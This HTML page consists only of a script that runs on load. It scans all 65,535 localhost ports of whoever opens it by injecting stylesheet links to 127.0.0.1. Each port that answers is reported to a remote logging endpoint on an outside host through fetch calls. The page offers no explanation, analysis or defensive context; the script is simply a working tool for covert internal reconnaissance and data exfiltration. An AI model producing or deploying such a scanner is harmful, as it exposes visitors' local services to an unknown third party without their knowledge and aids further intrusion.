<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
    
<script>
var from = 1;
var complete = true;
var clear = false;
function check(text){
    var linkEl = document.head.querySelector('link[href*="'+text+'"');
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener('load', function () {
        console.log(text)
        // log
		fetch("http://ccreater.top:60010/log.php?log="+text)
			.then(r=>r.text())
			.then(d=>{console.log("log success")})
		// log end
    });
}
function clearstyle(clear_from ,clear_to){
	clear = true;
	console.log("clear task start");
	while(clear_to<=clear_from){
            document.head.querySelector('link[href$=":'+clear_to+'"').remove();
			clear_to++;
    }
	clear = false;
	console.log("clear task end");
}
function make(text){
    head = document.getElementsByTagName('head')[0];
	var port = text;
    var url = "http://127.0.0.1:"+port,
    link = document.createElement('link');
    link.rel = "stylesheet";
    link.href = url;
    head.appendChild(link);
    check(text);
}
async function scan(){
	var to = from + 80 > 65535 ? 65535 : from + 80;
	for(var i=from;i<to;i++){
		make(String(i));
	}
	from +=80;
	setTimeout(()=>{clearstyle(from,to);},5000);
};

async function listener (){
	console.log("listener works,from:"+from+",complete:"+complete);
	if(from < 65535){
		setTimeout(listener,5000);
		if(complete && !clear){
			console.log("new task!");
			scan()
				.then(()=>{complete = true;})
			complete = false;
		}
	}
	
}
listener()
</script>
</body>
</html>
